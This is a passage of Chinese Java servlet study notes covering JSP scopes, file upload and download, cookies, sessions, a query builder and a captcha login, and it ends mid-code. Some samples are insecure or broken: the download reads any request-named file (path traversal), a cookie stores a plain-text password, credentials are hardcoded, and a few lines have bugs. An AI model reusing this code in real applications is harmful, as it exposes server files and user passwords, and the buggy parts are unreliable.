<p><img src="https://csn.damyoung.cn/image-20200914164605601.png" alt="image-20200914164605601"></p>
<p><img src="https://csn.damyoung.cn/image-20200914164615783.png" alt="image-20200914164615783"></p>
<h4 id="（4）pageContext域"><a href="#（4）pageContext域" class="headerlink" title="（4）pageContext域"></a>（4）pageContext域</h4><p>生命周期：对JSP请求时开始，<strong>当响应结束时销毁</strong></p>
<p>作用范围：整个JSP页面，是四大作用域中最小的一个，即超过这个页面就不能够使用了，</p>
<p><strong>但可以操作其他三个域对象</strong></p>
<ul>
<li>俩种方式来操作Request对象</li>
</ul>
<p><img src="https://csn.damyoung.cn/image-20200916143001663.png" alt="image-20200916143001663"></p>
<h3 id="9、文件的上传和下载"><a href="#9、文件的上传和下载" class="headerlink" title="9、文件的上传和下载"></a>9、文件的上传和下载</h3><p>导入jar包 commons-fileupload、commons-io-2.2</p>
<p><strong>上传和下载文件均需要绝对路径</strong></p>
<h4 id="9-1-上传"><a href="#9-1-上传" class="headerlink" title="9.1 上传"></a>9.1 上传</h4><p><strong>由于设置为文件可上传，故传统方式无法获得！！！！！！！！</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String username=req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">String age=req.getParameter(<span class="string">&quot;age&quot;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h5><blockquote>
<ul>
<li><p>设置表单可上传&lt;  form enctype=”multipart/form-data” action=”upload” method=”post”&gt;</p>
</li>
<li><p>UploadServlet</p>
<ul>
<li><p>判断表单是否支持文件上传 </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断表单是否支持文件上传,即enctype=&quot;multipart/form-data&quot;</span></span><br><span class="line"><span class="keyword">boolean</span> isMutipart=ServletFileUpload.isMultipartContent(req);</span><br><span class="line"><span class="keyword">if</span> (!isMutipart)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;表单必须设置为multipart/form-data&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建ServletFileUpload对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建工厂类，用于创建ServletFileUpload对象</span></span><br><span class="line">DiskFileItemFactory factory=<span class="keyword">new</span> DiskFileItemFactory();</span><br><span class="line">ServletFileUpload servletFileUpload=<span class="keyword">new</span> ServletFileUpload(factory);</span><br></pre></td></tr></table></figure>
</li>
<li><p>遍历获得表单文件(req.getParameter() 不可行，获得不到数据)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;FileItem&gt; files=servletFileUpload.parseRequest(req);</span><br><span class="line"> <span class="keyword">for</span> (FileItem fileItem:files)&#123;</span><br><span class="line">     <span class="comment">//处理普通表单项</span></span><br><span class="line">     <span class="keyword">if</span> (fileItem.isFormField())&#123;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>普通表单</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获得字段名username</span></span><br><span class="line">String filedName=fileItem.getFieldName();</span><br><span class="line"><span class="comment">//获得字段值:张三</span></span><br><span class="line">String fieldValue=fileItem.getString(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;username&quot;</span>.equals(filedName))&#123;</span><br><span class="line">    req.setAttribute(<span class="string">&quot;username&quot;</span>,fieldValue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>文件表单</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//处理文件表单项</span></span><br><span class="line"><span class="comment">//获取存储上传文件目录的绝对路径(服务器中的绝对路径)</span></span><br><span class="line">String uploadPath=getServletContext().getRealPath(<span class="string">&quot;/upload&quot;</span>);</span><br><span class="line"><span class="comment">//获取上传文件的名称</span></span><br><span class="line"><span class="comment">//文件名称可能带有客户端的路径 如:f:/pictures/xx.jpg</span></span><br><span class="line">String fileName=fileItem.getName();</span><br><span class="line"><span class="comment">//文件名称不带路径xx.jpg</span></span><br><span class="line">fileName= FilenameUtils.getName(fileName);</span><br><span class="line"></span><br><span class="line"><span class="comment">//上传文件</span></span><br><span class="line">File uploadFile=<span class="keyword">new</span> File(uploadPath,fileName);</span><br><span class="line">fileItem.write(uploadFile);</span><br><span class="line">req.setAttribute(<span class="string">&quot;filename&quot;</span>,fileName);</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    req.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">    resp.setContentType(<span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line">    PrintWriter out=resp.getWriter();</span><br><span class="line">    <span class="comment">//判断表单是否支持文件上传,即enctype=&quot;multipart/form-data&quot;</span></span><br><span class="line">    <span class="keyword">boolean</span> isMutipart=ServletFileUpload.isMultipartContent(req);</span><br><span class="line">    <span class="keyword">if</span> (!isMutipart)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;表单必须设置为multipart/form-data&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//创建工厂类，用于创建ServletFileUpload对象</span></span><br><span class="line">    DiskFileItemFactory factory=<span class="keyword">new</span> DiskFileItemFactory();</span><br><span class="line">    ServletFileUpload servletFileUpload=<span class="keyword">new</span> ServletFileUpload(factory);</span><br><span class="line">    <span class="comment">//解决上传表单中文乱码问题</span></span><br><span class="line">    servletFileUpload.setHeaderEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//限制上传文件的大小</span></span><br><span class="line">    <span class="comment">//表示单个文件最大不能超过500K</span></span><br><span class="line">    servletFileUpload.setFileSizeMax(<span class="number">500</span>*<span class="number">1024</span>);</span><br><span class="line">    <span class="comment">//表示多个上传文件合计最大不能超过1M</span></span><br><span class="line">    servletFileUpload.setSizeMax(<span class="number">1024</span>*<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        List&lt;FileItem&gt; files=servletFileUpload.parseRequest(req);</span><br><span class="line">        <span class="keyword">for</span> (FileItem fileItem:files)&#123;</span><br><span class="line">            <span class="comment">//处理普通表单项</span></span><br><span class="line">            <span class="keyword">if</span> (fileItem.isFormField())&#123;</span><br><span class="line">                <span class="comment">//因为表单设置为文件可上传, 传统方法，无法获取数据</span></span><br><span class="line">                String username=req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;11&quot;</span>+username);</span><br><span class="line">                String age=req.getParameter(<span class="string">&quot;age&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//获得字段名username</span></span><br><span class="line">                String filedName=fileItem.getFieldName();</span><br><span class="line">                <span class="comment">//获得字段值:张三</span></span><br><span class="line">                String fieldValue=fileItem.getString(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;username&quot;</span>.equals(filedName))&#123;</span><br><span class="line">                    req.setAttribute(<span class="string">&quot;username&quot;</span>,fieldValue);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;age&quot;</span>.equals(filedName))&#123;</span><br><span class="line">                    req.setAttribute(<span class="string">&quot;age&quot;</span>,fieldValue);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//处理文件表单项</span></span><br><span class="line">                <span class="comment">//获取存储上传文件目录的绝对路径(服务器中的绝对路径)</span></span><br><span class="line">                String uploadPath=getServletContext().getRealPath(<span class="string">&quot;/upload&quot;</span>);</span><br><span class="line">                System.out.println(uploadPath);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//获取上传文件的名称</span></span><br><span class="line">                <span class="comment">//文件名称可能带有客户端的路径 如:f:/pictures/xx.jpg</span></span><br><span class="line">                String fileName=fileItem.getName();</span><br><span class="line">                <span class="comment">//文件名称不带路径xx.jpg</span></span><br><span class="line">                fileName= FilenameUtils.getName(fileName);</span><br><span class="line"></span><br><span class="line">                File uploadFile=<span class="keyword">new</span> File(uploadPath,fileName);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//上传文件</span></span><br><span class="line">                fileItem.write(uploadFile);</span><br><span class="line">                req.setAttribute(<span class="string">&quot;filename&quot;</span>,fileName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;success.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (FileUploadBase.FileSizeLimitExceededException e) &#123;</span><br><span class="line">        req.setAttribute(<span class="string">&quot;errMsg&quot;</span>,<span class="string">&quot;文件过大，不能超过500K&quot;</span>);</span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;upload.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (FileUploadBase.SizeLimitExceededException e)&#123;</span><br><span class="line">        req.setAttribute(<span class="string">&quot;errMsg&quot;</span>,<span class="string">&quot;总文件过大，不能超过2M&quot;</span>);</span><br><span class="line">        req.getRequestDispatcher(<span class="string">&quot;upload.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="9-2-下载"><a href="#9-2-下载" class="headerlink" title="9.2 下载"></a>9.2 下载</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line">头像:&lt;img src=<span class="string">&quot;upload/$&#123;filename&#125;&quot;</span> align=<span class="string">&quot;top&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">    &lt;a href=&quot;download?filename=$&#123;filename&#125;&quot;&gt;下载&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>创建输入流</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String fileName=req.getParameter(<span class="string">&quot;filename&quot;</span>);</span><br><span class="line"><span class="comment">//获取要下载的文件所在的目录</span></span><br><span class="line">String dir=getServletContext().getRealPath(<span class="string">&quot;/upload&quot;</span>);</span><br><span class="line"><span class="comment">//创建输入流</span></span><br><span class="line">File file=<span class="keyword">new</span> File(dir,fileName);</span><br><span class="line">FileInputStream fileInputStream=<span class="keyword">new</span> FileInputStream(file);</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置浏览器–响应头</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fileName= URLEncoder.encode(fileName,<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"><span class="comment">//设置响应头,控制浏览器下载该文件</span></span><br><span class="line">resp.setHeader(<span class="string">&quot;content-disposition&quot;</span>,<span class="string">&quot;attachment;filename&quot;</span>+fileName);</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建输出流</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建输出流</span></span><br><span class="line">ServletOutputStream os=resp.getOutputStream();</span><br><span class="line"><span class="keyword">byte</span>[] buffer=<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"><span class="keyword">while</span> ((len=fileInputStream.read(buffer))!=-<span class="number">1</span>)&#123;</span><br><span class="line">    os.write(buffer,<span class="number">0</span>,len);</span><br><span class="line">&#125;</span><br><span class="line">fileOutputStream.close();</span><br><span class="line">os.close();</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="10、会话"><a href="#10、会话" class="headerlink" title="10、会话"></a>10、会话</h3><p>被浏览器独享的域对象，常用个人用户存储传递数据</p>
<h4 id="（1）Cookie"><a href="#（1）Cookie" class="headerlink" title="（1）Cookie"></a>（1）Cookie</h4><ul>
<li>客户端技术，程序把每个用户的数据以cookie的形式写给用户各自的浏览器。</li>
<li>当用户使用浏览器去访问服务器中的Web资源时，就会带着各自的数据去</li>
</ul>
<p><strong>Cookie是实则是Map存储，获取键<code>cookie.getName()</code> 获取值<code>cookie.getValue()</code>;</strong></p>
<p><strong>创建Cookie对象</strong> <strong>键值对</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Cookie cookie = <span class="keyword">new</span> Cookie(<span class="string">&quot;name&quot;</span>, name);</span><br><span class="line">Cookie cookie1 = <span class="keyword">new</span> Cookie(<span class="string">&quot;pwd&quot;</span>, pwd);</span><br></pre></td></tr></table></figure>

<p><strong>生命周期</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">cookie.setMaxAge(<span class="number">60</span>);</span><br><span class="line">cookie1.setMaxAge(<span class="number">60</span>);</span><br></pre></td></tr></table></figure>

<p><strong>添加cookie到浏览器</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">resp.addCookie(cookie);</span><br><span class="line">resp.addCookie(cookie1);</span><br></pre></td></tr></table></figure>

<p><strong>获取浏览器cookie</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Cookie[] cookies=req.getCookies();</span><br><span class="line"><span class="keyword">for</span> (Cookie cookie:cookies) &#123;</span><br><span class="line">    <span class="comment">//Cookie cookie = new Cookie(&quot;name&quot;, name);</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;name&quot;</span>.equals(cookie.getName()))&#123;</span><br><span class="line">        userName=cookie.getValue();</span><br><span class="line">        num=<span class="string">&quot;checked=&#x27;checked&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;pwd&quot;</span>.equals(cookie.getName()))&#123;</span><br><span class="line">        password=cookie.getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="（2）HttpSession"><a href="#（2）HttpSession" class="headerlink" title="（2）HttpSession"></a>（2）HttpSession</h4><ul>
<li>服务器技术，为每一个用户的浏览器创建其独享的HttpSession对象</li>
<li>访问web资源时，由于session为用户浏览器独享，访问web资源时，将数据存放在各自的session中</li>
<li>访问其他Web资源时，取出在用户各自的session 为用户服务</li>
</ul>
<p><strong>Session中的数据可供当前会话中所有Servlet共享</strong>,常用于登录验证</p>
<p><img src="https://csn.damyoung.cn/image-20200915144801366.png" alt="image-20200915144801366"></p>
<p><img src="https://csn.damyoung.cn/image-20200915144814022.png" alt="image-20200915144814022"></p>
<h3 id="11、监听器"><a href="#11、监听器" class="headerlink" title="11、监听器"></a>11、监听器</h3><h2 id="Servlet技术"><a href="#Servlet技术" class="headerlink" title="Servlet技术"></a>Servlet技术</h2><h4 id="模糊查询"><a href="#模糊查询" class="headerlink" title="模糊查询"></a>模糊查询</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 多条件查询</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Book&gt; <span class="title">searchBooks</span><span class="params">(String name,String category,String author,String minPrice,String maxPrice,</span></span></span><br><span class="line"><span class="function"><span class="params">                              String sales)</span></span>&#123;</span><br><span class="line">    StringBuilder stringBuilder=<span class="keyword">new</span> StringBuilder();</span><br><span class="line">    stringBuilder.append(<span class="string">&quot;select *from book where 1=1 &quot;</span>);</span><br><span class="line">    ArrayList list=<span class="keyword">new</span> ArrayList();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(name))&#123;</span><br><span class="line">        stringBuilder.append(<span class="string">&quot; and name like ?&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;%&quot;</span>+name+<span class="string">&quot;%&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(category))&#123;</span><br><span class="line">        stringBuilder.append(<span class="string">&quot; and category = ?&quot;</span>);</span><br><span class="line">        list.add(category);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(author))&#123;</span><br><span class="line">        stringBuilder.append(<span class="string">&quot; and author like ?&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;%&quot;</span>+author+<span class="string">&quot;%&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(minPrice))&#123;</span><br><span class="line">        stringBuilder.append(<span class="string">&quot; and price &gt;=?&quot;</span>);</span><br><span class="line">        list.add(minPrice);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(maxPrice))&#123;</span><br><span class="line">        stringBuilder.append(<span class="string">&quot; and price &lt;= ?&quot;</span>);</span><br><span class="line">        list.add(maxPrice);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(sales))&#123;</span><br><span class="line">        stringBuilder.append(<span class="string">&quot; and sales &gt;= ?&quot;</span>);</span><br><span class="line">        list.add(sales);</span><br><span class="line">    &#125;</span><br><span class="line">    String sql = stringBuilder.toString();</span><br><span class="line">    sql=sql+ <span class="string">&quot; order by id&quot;</span>;</span><br><span class="line"></span><br><span class="line">    QueryRunner queryRunner=<span class="keyword">new</span> QueryRunner(DruidUtils.getDataSource());</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> queryRunner.query(sql,<span class="keyword">new</span> BeanListHandler&lt;&gt;(Book.class),list.toArray());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1、图片验证"><a href="#1、图片验证" class="headerlink" title="1、图片验证"></a>1、图片验证</h4><p>myweb3/login</p>
<ul>
<li>登录验证输入</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        req.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        String username=req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        String password=req.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        String code=req.getParameter(<span class="string">&quot;code&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HttpSession session=req.getSession();</span><br><span class="line">        String vcode=(String)session.getAttribute(<span class="string">&quot;vcode&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (code.equals(vcode))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;admin&quot;</span>.equals(username) &amp;&amp; <span class="string">&quot;123&quot;</span>.equals(password))&#123;</span><br><span class="line"><span class="comment">//                session.setAttribute(&quot;username&quot;,username);</span></span><br><span class="line"><span class="comment">//                resp.sendRedirect(&quot;home&quot;);</span></span><br><span class="line">                session.setAttribute(<span class="string">&quot;username&quot;</span>,username);</span><br><span class="line">                resp.sendRedirect(<span class="string">&quot;home.jsp&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//                resp.setContentType(&quot;text/html; charset=UTF-8&quot;);</span></span><br><span class="line"><span class="comment">//                resp.getWriter().write(&quot;用户名或密码错误!3秒钟跳转到登录界面&quot;);</span></span><br><span class="line"><span class="comment">//                resp.setHeader(&quot;refresh&quot;,&quot;3;url=login.html&quot;);</span></span><br><span class="line">                String msg=<span class="string">&quot;账号密码输入错误&quot;</span>;</span><br><span class="line">                req.setAttribute(<span class="string">&quot;msg&quot;</span>,msg);</span><br><span class="line">                req.getRequestDispatcher(<span class="string">&quot;login.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//            resp.setContentType(&quot;text/html; charset=UTF-8&quot;);</span></span><br><span class="line"><span class="comment">//            resp.getWriter().write(&quot;验证码错误！3秒跳转到登录界面&quot;);</span></span><br><span class="line"><span class="comment">//            resp.setHeader(&quot;refresh&quot;,&quot;3;url=login2.html&quot;);</span></span><br><span class="line">            String msg=<span class="string">&quot;验证码错误&quot;</span>;</span><br><span class="line">            req.setAttribute(<span class="string">&quot;msg&quot;</span>,msg);</span><br><span class="line">            req.getRequestDispatcher(<span class="string">&quot;login.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>生成验证码</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> login;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.Color;</span><br><span class="line"><span class="keyword">import</span> java.awt.Font;</span><br><span class="line"><span class="keyword">import</span> java.awt.Graphics;</span><br><span class="line"><span class="keyword">import</span> java.awt.image.BufferedImage;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.imageio.ImageIO;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Servlet implementation class ValidCodeServlet</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> admin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/validCode&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ValidCodeServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">       </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#HttpServlet()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ValidCodeServlet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@see</span> HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">      <span class="comment">// 在内存中创建图象</span></span><br><span class="line">      <span class="keyword">int</span> width = <span class="number">120</span>, height = <span class="number">30</span>;</span><br><span class="line">      BufferedImage image = <span class="keyword">new</span> BufferedImage(width, height,</span><br><span class="line">            BufferedImage.TYPE_INT_RGB);</span><br><span class="line">      <span class="comment">// 获取图形上下文</span></span><br><span class="line">      Graphics g = image.getGraphics();</span><br><span class="line">      <span class="comment">// 生成随机类</span></span><br><span class="line">      Random random = <span class="keyword">new</span> Random();</span><br><span class="line">      <span class="comment">// 设定背景色</span></span><br><span class="line">      g.setColor(<span class="keyword">new</span> Color(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>));</span><br><span class="line">      g.fillRect(<span class="number">0</span>, <span class="number">0</span>, width, height);</span><br><span class="line">      <span class="comment">// 设定字体</span></span><br><span class="line">      g.setFont(<span class="keyword">new</span> Font(<span class="string">&quot;Times New Roman&quot;</span>, Font.PLAIN, <span class="number">23</span>));</span><br><span class="line">      <span class="comment">// 画边框</span></span><br><span class="line">      g.setColor(getRandColor(<span class="number">160</span>, <span class="number">200</span>));</span><br><span class="line">      g.drawRect(<span class="number">0</span>, <span class="number">0</span>, width - <span class="number">1</span>, height - <span class="number">1</span>);</span><br><span class="line">      <span class="comment">// 随机产生155条干扰线，使图象中的认证码不易被其它程序探测到</span></span><br><span class="line">      g.setColor(getRandColor(<span class="number">160</span>, <span class="number">200</span>));</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">         <span class="keyword">int</span> x = random.nextInt(width);</span><br><span class="line">         <span class="keyword">int</span> y = random.nextInt(height);</span><br><span class="line">         <span class="keyword">int</span> xl = random.nextInt(<span class="number">12</span>);</span><br><span class="line">         <span class="keyword">int</span> yl = random.nextInt(<span class="number">12</span>);</span><br><span class="line">         g.drawLine(x, y, x + xl, y + yl);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 取随机产生的认证码(4位数字)</span></span><br><span class="line">      StringBuilder sRand = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">         <span class="keyword">int</span> type = random.nextInt(<span class="number">3</span>);</span><br><span class="line">         <span class="comment">//产生一位随机的数字，大写或小与字母</span></span><br><span class="line">         String rand = getCaptchaPath(type);</span><br><span class="line">         sRand.append(rand);</span><br><span class="line">         <span class="comment">// 将认证码显示到图象中</span></span><br><span class="line">         g.setColor(<span class="keyword">new</span> Color(<span class="number">20</span> + random.nextInt(<span class="number">110</span>), <span class="number">20</span> + random</span><br><span class="line">               .nextInt(<span class="number">110</span>), <span class="number">20</span> + random.nextInt(<span class="number">110</span>)));</span><br><span class="line">         <span class="comment">// 调用函数出来的颜色相同，可能是因为种子太接近，所以只能直接生成</span></span><br><span class="line">         g.drawString(rand, <span class="number">26</span> * i + <span class="number">14</span>, <span class="number">23</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      HttpSession session=request.getSession();</span><br><span class="line">      <span class="comment">//将验证码存入session中</span></span><br><span class="line">      session.setAttribute(<span class="string">&quot;vcode&quot;</span>,sRand.toString());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 图象生效</span></span><br><span class="line">      g.dispose();</span><br><span class="line">      <span class="comment">// 输出图象到页面</span></span><br><span class="line">      ImageIO.write(image, <span class="string">&quot;JPEG&quot;</span>, response.getOutputStream());</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getCaptchaPath</span><span class="params">(<span class="keyword">int</span> type)</span> </span>&#123;</span><br><span class="line">      String result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">      Random random = <span class="keyword">new</span> Random();</span><br><span class="line">      <span class="keyword">if</span> (type == <span class="number">0</span>) &#123;</span><br><span class="line">         result = String.valueOf(random.nextInt(<span class="number">10</span>));</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="number">1</span>) &#123;</span><br><span class="line">         <span class="keyword">int</span> itmp = <span class="keyword">new</span> Random().nextInt(<span class="number">26</span>) + <span class="number">65</span>;</span><br><span class="line">         result = String.valueOf((<span class="keyword">char</span>) itmp);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">int</span> itmp = <span class="keyword">new</span> Random().nextInt(<span class="number">26</span>) + <span class="number">97</span>;</span><br><span class="line">         result = String.valueOf((<span class="keyword">char</span>) itmp);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> Color <span class="title">getRandColor</span><span class="params">(<span class="keyword">int</span> fc, <span class="keyword">int</span> bc)</span> </span>&#123;<span class="comment">// 给定范围获得随机颜色</span></span><br><span class="line">      Random random = <span class="keyword">new</span> Random();</span><br><span class="line">      <span class="keyword">if</span> (fc &gt; <span class="number">255</span>) &#123;</span><br><span class="line">         fc = <span class="number">255</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (bc &gt; <span class="number">255</span>) &#123;</span><br><span class="line">         bc = <span class="number">255</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">int</span> r = fc + random.nextInt(bc - fc);</span><br><span class="line">      <span class="keyword">int</span> g = fc + random.nextInt(bc - fc);</span><br><span class="line">      <span class="keyword">int</span> b = fc + random.nextInt(bc - 